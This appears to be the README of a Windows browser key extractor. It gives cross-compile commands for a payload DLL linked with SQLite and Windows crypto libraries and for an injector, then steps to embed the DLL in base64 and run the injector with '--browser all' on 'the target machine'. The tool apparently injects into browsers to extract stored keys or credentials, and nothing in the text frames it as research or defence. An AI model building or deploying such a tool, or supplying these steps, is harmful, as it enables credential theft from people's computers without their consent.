# C++ Browser Extractor

This is the C++ version of the browser key extractor.

## Build Instructions

You will need the MinGW-w64 cross-compiler (`x86_64-w64-mingw32-g++`) to build these components for Windows.

### 1. Build the Proxy DLL (payload.dll)

First, compile the SQLite amalgamation:

```bash
x86_64-w64-mingw32-gcc -O2 -c proxydll/src/sqlite3.c -o sqlite3.o
```

Then, build the DLL:

```bash
x86_64-w64-mingw32-g++ -O2 -std=c++17 -static -shared proxydll/src/lib.cpp sqlite3.o -o payload.dll -lbcrypt -lcrypt32 -lole32 -loleaut32 -lshlwapi
```

### 2. Build the Injector

Compile the injector executable:

```bash
x86_64-w64-mingw32-g++ -O2 -std=c++17 -static injector/src/main.cpp -o injector.exe -lbcrypt -lcrypt32 -lole32 -loleaut32 -lshlwapi
```

### 3. Usage

1. Build `payload.dll` and `injector.exe`.
2. Convert `payload.dll` to Base64 and paste it into `injector/src/main.cpp` (the `EMBEDDED_DLL_BASE64` constant).
3. Re-compile `injector.exe`.
4. Run `injector.exe --browser all` on the target machine.

Alternatively, if `EMBEDDED_DLL_BASE64` is left empty, the injector will look for `payload.dll` in the same directory.
